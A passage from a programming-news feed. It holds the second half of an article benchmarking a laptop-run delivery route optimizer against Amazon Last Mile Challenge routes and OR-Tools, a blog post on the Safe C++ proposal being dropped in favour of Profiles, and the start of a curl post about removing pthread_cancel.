balanced, ready-to-route groups that are both spatially coherent and logistically feasible, with <strong>sizes aligned to vehicle capacity and efficiency targets</strong>.</p><figure><div><p><span>Press enter or click to view image in full size</span></p></div><figcaption><strong>Figure 5. </strong>Each circle represents a delivery stop requiring service. All stops must be distributed among three vehicles, with the initial clustering to create a preliminary route assignment.</figcaption></figure><figure><div><p><span>Press enter or click to view image in full size</span></p></div><figcaption><strong>Figure 6. </strong>Initial clustering results show delivery points organized into three zones, utilizing geographic proximity and enhanced with package volume estimates.</figcaption></figure><h3>Step 3: Rebalancing</h3><p>Clusters are iteratively adjusted by redistributing stops to smooth out imbalances. Each cluster maintains awareness of neighboring clusters and can negotiate package transfers with adjacent zones, ensuring that no vehicle is overloaded or underutilized. This adjustment respects capacity, volume, and stop limits while producing a more balanced workload across the fleet and higher overall route efficiency.</p><figure><div><p><span>Press enter or click to view image in full size</span></p></div><figcaption><strong>Figure 7. </strong>The initial clustering results show unbalanced workload distribution. Arrows indicate delivery stops that <strong>need to be redistributed from overloaded clusters</strong> to achieve better balance.</figcaption></figure><figure><div><p><span>Press enter or click to view image in full size</span></p></div><figcaption><strong>Figure 8. </strong>After <strong>rebalancing</strong>, the clusters achieve a more balanced distribution. The algorithm has successfully redistributed delivery stops between neighboring clusters, improving workload balance while maintaining <strong>geographic coherence and satisfying vehicle capacity constraints</strong></figcaption></figure><h3>Step 4: Atomic Route Processing</h3><p>The system breaks down clusters into independent tasks and pulls them one by one into isolated CPU processes. At this stage, each cluster of delivery points<strong> is converted into a true delivery route</strong>: a sequential, ordered path that a driver could follow.</p><p>Routes are optimized independently, <strong>without shared state or dependencies</strong>. When a process finishes, it pulls the next task, keeping all cores busy and enabling true parallel optimization.</p><figure><div><p><span>Press enter or click to view image in full size</span></p></div><figcaption><strong>Figure 9. </strong>Clusters are decomposed into independent tasks placed in a central queue. Each CPU core pulls the next available task, ensuring full parallelization and continuous workload utilization.</figcaption></figure><h3>Step 5: Route Integration and Metrics Calculation</h3><p>All independently processed routes are <strong>merged into a unified solution</strong>. Metrics such as total distance, delivery time efficiency, vehicle utilization, and constraint compliance are then aggregated to provide a complete picture of network performance. This final step transforms route-level outputs into actionable, system-wide insights.</p><h2>2.5 Key Techniques That Enable Linear Scale</h2><h3>Parallel Atomic Tasks</h3><p>Break computations into small, independent tasks,<strong> enabling concurrency without shared state</strong>. The pipeline is divided into ingest &rarr; cluster &rarr; rebalance &rarr; route &rarr; aggregate (see 2.4).</p><p>This <strong>architectural approach</strong> enables <strong>near-linear scaling</strong>: more routes create more atomic tasks, and processing time increases proportionally on the same hardware. While additional CPUs or memory can accelerate performance, it isn&rsquo;t mandatory, since workloads are automatically batched to fit available resources regardless of dataset size.</p><figure><div><p><span>Press enter or click to view image in full size</span></p></div><figcaption><strong>Figure 10. </strong>The plot compares how processing <strong>time increases as the number of delivery stops grows</strong><em>. </em>It highlights how scaling to tens of thousands of stops drives computation time upwards, but still within feasible ranges</figcaption></figure><figure><div><p><span>Press enter or click to view image in full size</span></p></div><figcaption><strong>Figure 11. </strong>The plot compares how execution <strong>time scales with the number of optimized routes. </strong>The runtime grows linearly with the number of routes</figcaption></figure><h3>Key advantages</h3><p><strong>Hardware-adaptive batching</strong>: Large datasets are divided into batches that adapt to CPU and RAM limits (Full utilization without overload).</p><p><strong>Memory-efficient processing</strong>: Technically, it can handle <strong>unlimited stop counts</strong> by processing data in optimized chunks.</p><p><strong>In practice: </strong>whether routing 100 or 100K delivery points, the same hardware can handle both &mdash; the only difference is processing time.</p><h2>2.6 Intelligent Caching</h2><p>To eliminate redundant calculations, the system implements multi-level caching:</p><p><strong>In-Memory Graph &amp; Matrix Caching</strong>: Optimized graphs, distance matrices, and precalculated files are loaded directly into memory, avoiding repeated recomputation (typically a few MB per graph). This lets the Optimizer reuse results instantly instead of rebuilding them every time, making them lightweight enough to cache efficiently.</p><p><strong>Distance Query Caching:</strong> Frequently used distance queries are cached, cutting computation overhead dramatically.</p><p><strong>Route-Specific Graph Creation</strong>: Instead of loading one massive graph for an entire region (which could consume <strong>GBs of memory</strong>), the system generates small, focused mini-graphs (<strong>25&ndash;50 MB each</strong>) around the active service area. These localized files become the inputs later cached in memory, ensuring that ~70&ndash;90% of route calculations can reuse existing graphs while minimizing memory use and maintaining full routing accuracy.</p><figure><div><p><span>Press enter or click to view image in full size</span></p></div><figcaption><strong>Figure 12. </strong>Relationship between calculated routes (red rectangles) and cached graphs (blue rectangles). On average, each cached graph handles approximately <strong>10x</strong> individual routes.</figcaption></figure><p>These mini-graphs also follow a <strong>dynamic lifecycle</strong>: created on demand for each route request, stored in memory with a location-based key, reused when areas overlap, and cleaned up once inactive. This guarantees bounded memory usage, faster startup (no need to preload entire regions), and scalability that grows with active routes rather than with the total dataset size.</p><h2>2.7 Complete System Parameterization</h2><p>The system is highly configurable, and outcomes can vary significantly depending on the chosen setup. For example:</p><p>Prioritizing <strong>time windows</strong> may require adding extra routes to guarantee punctuality. Pushing for <strong>maximum vehicle load</strong> reduces fleet size but can increase travel inefficiency.</p><p>By default, the Optimizer pursues a balanced objective targeting high fleet utilization, minimal kilometers, and on-time service. When required, the system can be configured to enforce specific strategies (maximizing fleet load) even at the expense of other metrics.</p><h3>2.7.1 Smart Load Balancing</h3><p><strong>Per-vehicle</strong>: minimum/maximum load percentages to prevent both underfilled and overloaded trips (e.g., 60&ndash;85%).<br><strong>System-wide</strong>: a global load target (e.g., ~80%) toward which average utilization converges across routes and batches.</p><h3>2.7.2 Routing &amp; Time Windows</h3><p><strong>Optimization criteria</strong>: length vs. travel time vs. balanced approach<br><strong>Time window handling</strong>: enable/disable time window optimization</p><p>Increasing load targets typically reduces route count but tends to lengthen routes and increase time-window pressure. Prioritizing time over distance protects punctuality at the cost of a few additional routes. In dense areas, consolidation can be more aggressive; in sparse regions, prefer smaller routes and slightly lower load targets to avoid zigzags.</p><h2>2.8 On-Demand Routing</h2><p>Beyond static planning, the optimizer also supports inserting new stops <strong>on demand</strong> into an already optimized solution. When extra stops appear after the initial plan is set, the system evaluates each new stop and assigns it to the most suitable route, respecting vehicle capacities, time-window constraints, and existing workloads. This allows the solution to <strong>reorganize routes in real time</strong>, ensuring late-arriving orders can still be delivered efficiently.</p><p>While today this runs as a service that accepts new stops and rebalances them within existing routes, <strong>the design is forward-looking</strong>: it lays the foundation for a future <strong>dynamic routing system</strong> capable of continuous adjustments during the delivery day, reacting to traffic, cancellations, urgent new requests, or mixed delivery and pickup operations.</p></div><div><blockquote><p><strong><em>3. Part III &mdash; Results &amp; Performance Analysis</em></strong></p></blockquote><h2>3.1 Evaluation Methodology</h2><p>To ensure fair evaluation, both Amazon&rsquo;s original routes and the optimized ones are analyzed with the same multi-engine pipeline.</p><h3>3.1.1 Multi-Engine Distance Calculation:</h3><p>Distances are calculated with multiple engines, then averaged into a blended metric for fair comparison:</p><ul><li><strong>Local Graph (OpenStreetMap-based)</strong>: A local road graph from OpenStreetMaps (OSMnx library), producing consistent estimates based on static road layouts. Here, the distances reported are strictly those computed by the service&rsquo;s own logic.</li><li><strong>Local OSRM (OpenStreetMap-based)</strong>: A self-hosted routing engine serving a preprocessed OSM road graph.</li><li><strong>OpenRouteService (hosted API)</strong>: A public routing service powered by OpenStreetMap, returning real-world road distances and times (api.openrouteservice.org).</li><li><strong>Google Directions API</strong>: A commercial, industry-standard routing engine that factors in real-time traffic and dynamic road conditions.</li></ul><h3>3.1.2 Distance Calculation Workflow</h3><p>Most routing engines limit the number of waypoints per request (typically 25&ndash;50). Longer routes are automatically split into smaller segments, processed sequentially, and recombined into route totals, which are then aggregated at the depot level.<br>[<strong>segment totals &rarr; route totals &rarr; depot totals</strong>]</p><h3>3.1.3 Operational Metrics</h3><p>Beyond distance, performance is measured by route count, stops per route, vehicle utilization, and load efficiency &mdash; capturing <strong>how effectively the fleet is balanced</strong>.<br>The dataset also includes time windows <strong>(TW) </strong>for <strong>~7&ndash;8% of stops</strong>. <strong>Amazon&rsquo;s original plans missed ~1.8% </strong>of these, a baseline for comparing optimizer performance.</p><h2>3.2 Depots and Scale Classes</h2><p>To contextualize the performance results, depots in the dataset can be grouped into three operational scales based on their stop counts:</p><ul><li><strong>Small (5K&ndash;30K):</strong> DBO1 (8,205), DSE2 (12,962), DLA3 (29,497)</li><li><strong>Medium (30K&ndash;80K):</strong> DAU1 (31,060), DSE5 (78,039), DSE4 (63,701)</li><li><strong>Large (80K&ndash;175K+):</strong> DLA7 (173,738), DBO3 (90,362), DLA9 (98,181)</li></ul><h2>3.3 Real-World Performance Validation</h2><p>To validate the route optimization algorithm&rsquo;s effectiveness, I analyzed two depots of very different scales, demonstrating consistent performance improvements across varying operational complexities.</p><h3>3.3.1 Study Design &amp; Methodology</h3><p>Both case studies follow the same comparative framework:</p><ul><li>Comparison between Amazon&rsquo;s baseline routes and the optimizer&rsquo;s solution on the same stop data.</li><li><strong>Metrics</strong>: Route count, vehicle utilization, stops per route, and total distance across multiple routing engines</li></ul><h3>3.3.2 Case Study 1: Small-Scale Operations (DSE2, 125 routes)</h3><h3>Scenario Overview</h3><ul><li><strong>Location</strong>: DSE2 Depot, Seattle metropolitan area</li><li><strong>Total stops</strong>: 12,962 (<strong>1,230 time-window constraints</strong>)</li><li><strong>Total packages:</strong> 27,022 (2.08 packages per stop)</li><li><strong>Amazon baseline fleet: </strong>125 routes, 80 V2 + 45 V3 vehicles</li></ul><h3>3.3.3 Performance Results (DSE2)</h3><p>Amazon used 80 V2 + 45 V3 vehicles. The optimizer achieved the same demand with only <strong>51/80 V2</strong> and all <strong>45 V3 </strong>vehicles, cutting distance by <strong>~31%</strong> while reducing the active fleet. This was achieved by increasing load density per vehicle, resulting in higher utilization and fewer routes overall.</p><figure><div><p><span>Press enter or click to view image in full size</span></p></div><figcaption><strong>Figure 13 </strong>DSE2 Results: Fewer routes, higher utilization, and ~31% less distance compared to Amazon&rsquo;s baseline.</figcaption></figure><h3>Time-Window Compliance (DSE2)</h3><p>In addition to distance and utilization, I also measured <strong>time-window (TW) compliance</strong>. Out of <strong>1,230 stops</strong> with time-window constraints (covering a total of <strong>2,497 packages</strong>), the optimizer successfully placed <strong>1,225 stops</strong> within their assigned windows.<br>Only <strong>5 stops</strong> fell outside, representing a violation rate of just <strong>0.41%</strong> &mdash; both when measured by stops and by packages. For comparison, Amazon&rsquo;s original plans in the dataset show an average violation rate of ~<strong>1.8%</strong>, meaning the optimizer achieved a substantially lower rate of missed windows under identical constraints.</p><h3>3.3.4 Visual Analysis (DSE2)</h3><p>The optimization reveals improvements in route clustering and <strong>overlap reduction</strong>:</p><figure><div><p><span>Press enter or click to view image in full size</span></p></div><figcaption><strong>Figure 14.</strong> DSE2 &mdash; Amazon routes (12,962 stops; 125 routes). Network showing significant overlap</figcaption></figure><figure><div><p><span>Press enter or click to view image in full size</span></p></div><figcaption><strong>Figure 15.</strong> DSE2 &mdash; Optimizer routes (12,962 stops; 96 routes). Network with cleaner territorial divisions</figcaption></figure><h3>3.3.5 Zoomed-in Cluster Comparison &mdash; Overlap Reduction and Balanced Partitioning</h3><p>The zoomed-in comparison (<em>Figures 16&ndash;17</em>) illustrates how the optimizer achieves cleaner territorial divisions within specific sub-regions, eliminating the route overlap visible in Amazon&rsquo;s original configuration.</p><figure><div><p><span>Press enter or click to view image in full size</span></p></div><figcaption><strong>Figure 16.</strong> DSE2 &mdash; Zoomed-in <strong>Amazon</strong> actual routes</figcaption></figure><figure><div><p><span>Press enter or click to view image in full size</span></p></div><figcaption><strong>Figure 16.</strong> DSE2 &mdash; Zoomed-in <strong>Optimizer</strong> routes</figcaption></figure><h3>3.3.6 Full Route and Segment Data (DSE2, Seattle) &mdash; Validating Routes with Google&rsquo;s API</h3><p>To complement the DSE2 case study, I provide <strong>the complete per-route segment files</strong>, calculated with <strong>Google Directions API</strong>. Each route is split into main segments (&le;25 waypoints, API limit) and further into sub-segments (&le;8 waypoints, visualization limit).</p><p>These files allow you to inspect the full routing logic, step by step, for both <strong>Amazon&rsquo;s baseline (125 routes)</strong> and the <strong>Optimizer&rsquo;s solution (96 routes)</strong>.</p><p><a href="https://drive.google.com/file/d/1HSHLxOCagJfbTHjxy4y0_PU7GuEAKydJ/view?usp=drive_link">Amazon Baseline Routes</a> (125 routes): <strong>5,156.63 km</strong><br><a href="https://drive.google.com/file/d/1WcPskAePESCOlN6Cp6J0S9CtE5S1pNoB/view?usp=drive_link">Optimizer Routes</a> (96 routes):<strong> 3,410.03 km </strong>(&asymp;34% less distance)</p><h3>3.3.7 Case Study 2: Large-Scale Operations (DLA7, 1133 routes)</h3><h3>Scenario Overview</h3><ul><li><strong>Location</strong>: DLA7 Depot, Los Angeles metropolitan area</li><li><strong>Total stops</strong>: <strong>173,738</strong> delivery stops (<strong>9,609 time-window constraints</strong>)</li><li><strong>Total packages:</strong> 264,302 (1.52 packages per stop)</li><li><strong>Amazon baseline fleet: </strong>1133 routes, 1133 V2 vehicles</li></ul><h3>3.3.8 Performance Results (DLA7)</h3><p>For DLA7, results are computed using the same per-leg methodology, but analysis is limited to three routing engines: Local OSM Graph, OSRM, and OpenRouteService. Google Maps API was excluded from this analysis due to the exceptionally high volume of API requests required, which would result in significant cost implications.</p><figure><div><p><span>Press enter or click to view image in full size</span></p></div><figcaption><strong>Figure 18.</strong> DLA7 Results: Fewer routes, higher utilization, and ~31% less distance compared to Amazon&rsquo;s baseline.</figcaption></figure><h3>3.3.9 Visual Analysis (DLA7)</h3><figure><div><p><span>Press enter or click to view image in full size</span></p></div><figcaption><strong>Figure 19.</strong> DLA7 &mdash; Amazon routes (173,738 stops; 1133 routes). Network showing significant overlap</figcaption></figure><figure><div><p><span>Press enter or click to view image in full size</span></p></div><figcaption><strong>Figure 20.</strong> DLA7 &mdash; Optimizer routes (173,738 stops; 946 routes). Network with cleaner territorial divisions</figcaption></figure><h3>3.3.10 Zoomed-in Cluster Comparison (DLA7)</h3><figure><div><p><span>Press enter or click to view image in full size</span></p></div><figcaption><strong>Figure 21.</strong> DLA7 &mdash; Zoomed-in <strong>Amazon</strong> actual routes</figcaption></figure><figure><div><p><span>Press enter or click to view image in full size</span></p></div><figcaption><strong>Figure 22.</strong> DLA7 &mdash; Zoomed-in <strong>Route Optimizer</strong> result clustering routes</figcaption></figure><h2><strong>3.4 Cross-Scale Consistency</strong></h2><p>Although the two examples differ dramatically in scale &mdash; DSE2 with ~13k stops vs. DLA7 with ~174k stops, <strong>nearly 13&times; larger</strong> &mdash; the optimization gains remain similar.</p><p>The improvements are <strong>not limited to small scenarios</strong> but scale reliably to large operations. While these two case studies highlight substantial efficiency gains, <strong>not every depot will exhibit improvements of the same magnitude</strong>.</p><h2>3.5 Detailed Route Visualization</h2><p>When zooming into individual routes generated by the optimizer, we can inspect the full delivery sequence at a granular level. Each stop is assigned a <strong>sequential index</strong> that represents the exact order a driver would follow.</p><p>It provides a verifiable record for <strong>manual auditing and quality assurance</strong>.</p><figure><div><p><span>Press enter or click to view image in full size</span></p></div><figcaption><strong>Figure 19. </strong>Detailed sequencing of a generated route by the Optimizer</figcaption></figure><h2>3.6 Cross-Scenario Comparisons (All Depots)</h2><h3>3.6.1 Average Distance (km) &mdash; Amazon vs Optimizer</h3><p>These charts illustrate the total kilometers traveled across all depots, comparing Amazon&rsquo;s baseline routes (blue) with the optimized routes produced by the Router Optimizer (green).</p><p>Each bar pair shows the average total kilometers required to serve each depot. In this dataset, the Optimizer reduces kilometers across every depot &mdash; some only modestly (DBO1), others substantially (DLA7) &mdash; while serving the same delivery workload.</p><figure><div><p><span>Press enter or click to view image in full size</span></p></div><figcaption><strong>Figure 20. </strong>Total kilometers traveled across all depots, comparing Amazon&rsquo;s baseline routes (blue) with the optimized routes produced by the Router Optimizer (green).</figcaption></figure><p><strong>Trend across all depots:</strong> Improvements are not random but follow a robust and reproducible pattern. The bigger the problem, the more competitive the optimizer becomes compared to Amazon&rsquo;s baseline routes.</p><figure><div><p><span>Press enter or click to view image in full size</span></p></div><figcaption><strong>Figure 21. </strong>Improvement % vs. Initial Amazon km count: The larger the depot, the greater the efficiency gains</figcaption></figure><h3>3.6.2 Fleet Size vs Capacity Utilization (All Depots)</h3><p>In most depots, the optimizer cuts routes while raising utilization (cargo efficiency). By packing stops more coherently, the fleet runs with a <strong>higher average load</strong> while requiring <strong>fewer vehicles</strong>.</p><figure><div><p><span>Press enter or click to view image in full size</span></p></div><figcaption><strong>Figure 22 &mdash; </strong>Fleet Size vs Cargo Efficiency (All Depots). Bars (left axis) represent the number of routes, and lines (right axis) show how much vehicle capacity was actually used.</figcaption></figure><h3>3.6.3 Improvement % vs Routes (count)</h3><p>Smaller scenarios (under 200 routes) display high variability, ranging from modest single-digit improvements to exceptional gains of over 30%. However, as the number of routes increases, the optimizer&rsquo;s performance becomes dramatically more consistent and powerful. For [medium-large]-scale depots (2<strong>00+ routes</strong>), the optimizer consistently achieves <strong>10&ndash;30% reductions in distance traveled.</strong></p><figure><div><p><span>Press enter or click to view image in full size</span></p></div><figcaption><strong>Figure 23. </strong>Improvement % vs Routes &mdash; Larger depots with more routes show stronger and more consistent gains. <strong>Bars sorted left-to-right by route count (ascending)</strong></figcaption></figure><h3>3.6.4 Stops vs Execution Time &mdash; Linear Scaling of the Optimizer</h3><p>It provides a direct view of how processing time grows as the size of the routing problem increases, from a smaller depot (DBO1, 8.2k stops) to our largest (DLA7, ~174k stops)</p><figure><div><p><span>Press enter or click to view image in full size</span></p></div><figcaption><strong>Figure 24. </strong>This chart compares the number of delivery stops (blue bars) with the execution time required by the Optimizer (red line) across different depots.</figcaption></figure><p><strong>Stops &harr; Execution Time Relationship</strong><br>Execution time grows as the number of stops increases, but the relationship is approximately <strong>linear </strong>over the tested range.</p><h2>3.6.5 Execution at Scale</h2><p>Across all depots, the Optimizer consistently delivered results at remarkable speed. Thanks to <strong>cached road graphs</strong> and a memory-light design, execution never hit a bottleneck &mdash; even with the largest inputs. Each process manages and releases memory independently, ensuring that the runtime grows linearly with problem size.</p><p>The largest single depot (DLA7: ~1133 routes, ~174k stops) completed in just <strong>~30 minutes</strong>, while the <strong>entire dataset of over 1 million stops finished in ~2.5 hours</strong> on a MacBook Pro M1 (16 GB RAM).</p><p>Beyond speed, the system produced significantly <strong>better fleet efficiency: </strong>the total number of routes was reduced by an average of <strong>11.6%</strong>, the average vehicle load (stops per route) increased by <strong>11.7%</strong>, and the total kilometers traveled dropped by an average of <strong>18.5%</strong> compared to the baseline. All operational constraints were preserved, with capacity limits fully respected and time windows met at a very high compliance rate (<strong>~</strong>95%).</p><h3>Throughput per 1,000 Stops &amp; Predictive Scaling</h3><p>Across all depots, the average processing time is <strong>~9.8 seconds per 1,000 stops</strong> (observed range <strong>8.05&ndash;14.01 s/1k</strong>). Using the dataset&rsquo;s average route size of <strong>~150 stops</strong>, that&rsquo;s roughly <strong>~1.5 seconds to process a 150-delivery route</strong>. Because runtimes are close to linear and largely CPU-bound, this rule of thumb also supports <strong>predictive</strong> estimates on bigger hardware. Taking AWS&rsquo;s <strong>two highest-end compute-optimized machines</strong> as reference (&asymp;<strong>96 vCPUs</strong> and &asymp;<strong>192 vCPUs</strong>, i.e., ~12&times; and ~24&times; the laptop&rsquo;s core count), the projected times for <strong>500,000 stops</strong> would be <strong>~6&ndash;7 minutes</strong> and <strong>~3&ndash;4 minutes</strong>, respectively.</p><p><strong>These are not measured results, but the prediction is highly reliable</strong>: the algorithm decomposes work into independent atomic tasks with a <strong>known, bounded RAM footprint</strong>, so adding CPUs yields <strong>more parallel task execution</strong> with minimal contention.</p><h3>Cross-Hardware Check (2015 Intel Mac)</h3><p>For additional context, I also ran the pipeline on a <strong>2015 Retina 15-inch MacBook Pro (Mid-2015)</strong> &mdash; quad-core Intel Core <strong>i5</strong>, 16 GB RAM. Despite being a 10+ year-old laptop, end-to-end runtimes were <strong>~3&ndash;4&times;</strong> slower than on the M1 laptop, consistent with older per-core performance and fewer effective parallel workers. Results remained stable and within memory limits, and throughput still scaled predictably with problem size.</p><p><strong>This is possible because the Optimizer </strong>is<strong> </strong>hardware-adaptive batching, which keeps concurrency within the machine&rsquo;s limits, so tasks queue rather than crash. In short, high-end hardware reduces wall-clock time, but it isn&rsquo;t a prerequisite for correctness or feasibility.<strong> Even a 10+-year-old laptop can process the full Amazon Challenge (~1M stops)</strong>.</p><p>Put simply, <strong>hardware isn&rsquo;t a barrier to operability; it just governs speed</strong>: by adding or removing CPU resources, you can dial the wall-clock time up or down while the algorithm and results remain the same.</p><h2>3.7. Comparative Benchmark: Optimizer vs. Google OR-Tools</h2><p>Google OR-Tools is one of the most recognized open-source solvers for the Vehicle Routing Problem (VRP). For this comparison, the focus was on <strong>intra-cluster routing</strong> &mdash; measuring how quickly each solver could optimize the order of stops within a pre-defined set of clusters.<br>To demonstrate, both systems were tested on the smallest depot (DBO1, 8,205 stops grouped into 55 routes). Both solvers were given the same clustered inputs (unsequenced ~150 stops); their task was simply to return the best stop sequence for each route.</p><p>The Optimizer solved all 55 routes in just 98 seconds (~1.7 s per route), while OR-Tools required about 50 minutes (~54 s per route). At depot scale, the Optimizer ran <strong>~30&times; faster</strong>, and still delivered routes ~20% shorter in total distance. Its efficiency comes from a dual strength &mdash; <strong>smart clustering algorithms</strong> and <strong>fast intra-route optimizers</strong>, showing that <strong>high-quality solutions can be produced in seconds</strong>, not hours.</p></div><div><h2>Final Insights</h2><p>This work demonstrates that <strong>large-scale route optimization</strong> can be executed efficiently on modest hardware. By prioritizing high-quality clustering over perfect route paths, employing fine-grained parallelization, and ensuring balanced vehicle loads, the Optimizer delivers consistent improvements over Amazon&rsquo;s reported baselines, all while maintaining <strong>computational complexity within linear bounds</strong>.</p><p>In practice, the architecture scales <strong>near-linearly</strong> on the same hardware: more demand produces more independent tasks that can be processed predictably, keeping runtimes stable and budget-friendly.</p><p>The goal was not merely to demonstrate that city-scale routing is possible on a laptop, but to ensure it runs reliably on constrained hardware. This efficiency inherently <strong>translates to faster execution on larger machines, lower infrastructure costs, and shorter times </strong>for high-volume operations.</p><p><strong>Sometimes the best solution isn&rsquo;t the most complex one. </strong>By breaking down the problem and applying the right principles, we can outperform industry leaders <strong>using nothing more than a single laptop</strong>.</p><h2>Next Steps &amp; Availability</h2><p>In the near term, the Optimizer will be exposed as an <strong>API for experimentation and at-scale routing</strong>. The initial release will include endpoints to submit stops, fleet, packages, and time window constraints, returning sequenced routes and key metrics (distance, capacity utilization, time-window compliance). <br>If you&rsquo;re interested in early access for pilots or benchmarks, get in touch, and I&rsquo;ll share timelines and documentation.</p><h2>Sources</h2><ul><li><a href="https://routingchallenge.mit.edu/">Amazon Last Mile Challenge</a></li><li><a href="https://registry.opendata.aws/amazon-last-mile-challenges/">Amazon Last Mile Challenge &mdash; datasets</a></li><li><a href="https://news.mit.edu/2021/last-mile-routing-research-challenge-three-winning-teams-0824">MIT News on Last-Mile Research</a></li><li><a href="https://www.networkpages.nl/a-big-breakthrough-in-the-euclidean-travelling-salesman-problem/">TSP Research Breakthroughs</a></li><li><a href="https://www.researchgate.net/publication/373923950_Understanding_Last-Mile_Delivery_An_Analysis_of_the_Amazon_Last_Mile_Routing_Dataset">Analysis of the Amazon Last Mile Routing Dataset</a></li></ul></div></div></article><div class="gallery"><p><img src="https://miro.medium.com/v2/resize:fill:64:64/1*tqapzs4AfijKv2uT3Vx2lA.jpeg"></p></div></section>]]></description><pubDate>Tue, 16 Sep 2025 02:14:34 +0530</pubDate></item><item><link>https://sibellavia.lol/posts/2025/09/safe-c-proposal-is-not-being-continued/</link><title>Safe C++ proposal is not being continued (sibellavia.lol)</title><guid isPermaLink="true">https://www.reddit.com/r/programming/comments/1nhwalt/safe_c_proposal_is_not_being_continued/</guid><comments>https://www.reddit.com/r/programming/comments/1nhwalt/safe_c_proposal_is_not_being_continued/</comments><description><![CDATA[<section class='reading-time-and-permalink'><p>Reading time: 5 min | <a href='https://www.reddit.com/r/programming/comments/1nhwalt/safe_c_proposal_is_not_being_continued/'>Post permalink</a></p></section><section class='separator separator-before-parsed-content'><p>&nbsp;</p><hr><p>&nbsp;</p></section><section class='parsed-content'><div><p>One year ago, the <a href="https://safecpp.org/draft.html">Safe C++ proposal</a> was made. The goal was to add a safe subset/context into C++ that would give strong guarantees (memory safety, type safety, thread safety) similar to what Rust provides, without breaking existing C++ code. It was an extension or superset of C++. The opt-in mechanism was to explicitly mark parts of the code that belong to the safe context. The authors even state:</p><blockquote><p>Code in the safe context exhibits the same strong safety guarantees as code written in Rust.</p></blockquote><p>The rest remains &ldquo;unsafe&rdquo; in the usual C++ sense. This means that existing code continues to work, while new or refactored parts can gain safety. For those who write Rust, Safe C++ has many similarities with Rust, sometimes with adjustments to fit C++&rsquo;s design. Also, because C++ already has a huge base of &ldquo;unsafe code&rdquo;, Safe C++ has to provide mechanisms for mixing safe and unsafe, and for incremental migration. In that sense, all of Safe C++&rsquo;s safe features are opt-in. Existing code compiles and works as before. Introducing safe context doesn&rsquo;t break code that doesn&rsquo;t use it.</p><p>The proposal caught my interest. It seemed like a good compromise to make C++ safe, although there were open or unresolved issues, which is completely normal for a draft proposal. For example, how error reporting for the borrow checker and lifetime errors would work, or how generic code and templates would interact with lifetime logic and safe/unsafe qualifiers. These are just some of the points, the proposal is very long and elaborate. Moreover, I am not a programming language designer, so there might be better alternatives.</p><p>Anyway, today I discovered that the proposal will no longer be pursued. When I thought about the proposal again this morning, I realized I hadn&rsquo;t read any updates on it for some time. So I searched and found some answers on <a href="https://www.reddit.com/r/cpp/comments/1lhbqua/any_news_on_safe_c/">Reddit</a>.</p><p>The response from Sean Baxter, one of the original authors of the Safe C++ proposal:</p><blockquote><p>The Safety and Security working group voted to prioririze Profiles over Safe C++. Ask the Profiles people for an update. Safe C++ is not being continued.</p></blockquote><p>And again:</p><blockquote><p>The Rust safety model is unpopular with the committee. Further work on my end won&rsquo;t change that. Profiles won the argument. All effort should go into getting Profile&rsquo;s language for eliminating use-after-free bugs, data races, deadlocks and resource leaks into the Standard, so that developers can benefit from it.</p></blockquote><p>So I went to read the documents related to Profiles[1][2][3][4]. I try to summarize what I understood: they are meant to define modes of C++ that impose constraints on how you use the language and library, in order to guarantee certain safety properties. They are primarily compile-time constraints, though in practice some checks may be implemented using library facilities that add limited runtime overhead. Instead of introducing entirely new language constructs, profiles mostly restrict existing features and usages. The idea is that you can enable a profile, and any code using it agrees to follow the restrictions. If you don&rsquo;t enable it, things work as before. So it&rsquo;s backwards-compatible.</p><p>Profiles seem less radical and more adoptable, a safer-by-default C++ without forcing the Rust model that aims to tackle the most common C++ pitfalls. I think Safe C++ was more ambitious: introducing new syntax, type qualifiers, safe vs unsafe contexts, etc. Some in the committee felt that was too heavy, and Profiles are seen as a more pragmatic path. The main objection is obvious: one could say that Profiles restrict less than what Safe C++ aimed to provide.</p><p>Reading comments here and there, there is visible resistance in the community toward adopting the Rust model, and from a certain point of view, I understand it. If you want to write like Rust, just write Rust. Historically, C++ is a language that has often taken features from other worlds and integrated them into itself. In this case, I think that safety subsets of C++ already exist informally somehow. Profiles are an attempt to standardize and unify something that already exists in practice. Technically, they don&rsquo;t add new fundamental semantics. Instead, they provide constraints, obligations and guarantees.</p><p>In my opinion, considering the preferences of the committee and the entire C++ community, although I appreciated the Safe C++ proposal and was looking forward to seeing concrete results, considering the C++ context I believe that standardizing and integrating the Profiles as proposed is a much more realistic approach. Profiles might not be perfect, but they are better than nothing. They will likely be uneven in enforcement and weaker than Safe C++ in principle. They won&rsquo;t give us silver-bullet guarantees, but they are a realistic path forward.</p><p>[1] <a href="https://www.open-std.org/jtc1/sc22/wg21/docs/papers/2025/p3081r1.pdf">Core safety profiles for C++26</a></p><p>[2] <a href="https://open-std.org/jtc1/sc22/wg21/docs/papers/2025/p3589r0.pdf">C++ Profiles: The Framework</a></p><p>[3] <a href="https://www.open-std.org/jtc1/sc22/wg21/docs/papers/2025/p3704r0.pdf">What are profiles?</a></p><p>[4] <a href="https://www.open-std.org/jtc1/sc22/wg21/docs/papers/2025/p3651r0.pdf">Note to the C++ standards committee members</a></p><hr><p>Join the conversation on <a href="https://news.ycombinator.com/item?id=45234460">Hacker News</a> and <a href="https://www.reddit.com/r/cpp/comments/1ngjemb/safe_c_proposal_is_not_being_continued/">Reddit</a>.</p></div></section>]]></description><pubDate>Tue, 16 Sep 2025 01:26:23 +0530</pubDate></item><item><link>https://eissing.org/icing/posts/rip_pthread_cancel/</link><title>RIP pthread_cancel (eissing.org)</title><guid isPermaLink="true">https://www.reddit.com/r/programming/comments/1nhwagp/rip_pthread_cancel/</guid><comments>https://www.reddit.com/r/programming/comments/1nhwagp/rip_pthread_cancel/</comments><description><![CDATA[<section class='reading-time-and-permalink'><p>Reading time: 3 min | <a href='https://www.reddit.com/r/programming/comments/1nhwagp/rip_pthread_cancel/'>Post permalink</a></p></section><section class='separator separator-before-parsed-content'><p>&nbsp;</p><hr><p>&nbsp;</p></section><section class='parsed-content'><div><p>I posted about adding <a href="https://eissing.org../pthread_cancel">pthread_cancel use in curl</a> about three weeks ago, we released this in curl 8.16.0 and it blew up right in our faces. Now, with <a href="https://github.com/curl/curl/pull/18540">#18540</a> we are ripping it out again. What happened?</p><h2>short recap</h2><p><a href="https://www.man7.org/linux/man-pages/man7/pthreads.7.html">pthreads</a> define &ldquo;Cancelation points&rdquo;, a list of POSIX functions where a pthread may be cancelled. In addition, there is also a list of functions that <em>may</em> be cancelation points, among those <code>getaddrinfo()</code>.</p><p><code>getaddrinfo()</code> is exactly what we are interested in for <code>libcurl</code>. It blocks until it has resolved a name. That may hang for a long time and <code>libcurl</code> is unable to do anything else. Meh. So, we start a pthread and let that call <code>getaddrinfo()</code>. <code>libcurl</code> can do other things while that thread 